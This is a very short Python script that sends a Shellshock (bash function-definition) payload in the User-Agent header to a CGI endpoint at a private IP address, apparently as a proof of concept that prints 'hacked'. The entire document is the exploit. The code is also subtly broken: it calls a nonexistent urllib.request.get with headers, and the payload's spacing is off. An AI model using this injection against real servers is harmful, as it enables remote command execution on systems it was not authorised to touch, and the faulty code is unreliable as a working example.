import urllib.request
import urllib.parse

url = 'http://192.168.13.34/cgi-bin/vulnerable'
headers = {'User-Agent':'() {:;}; echo "hacked"'}
f = urllib.request.get(url, headers=headers)
print(f.read().decode('utf-8'))

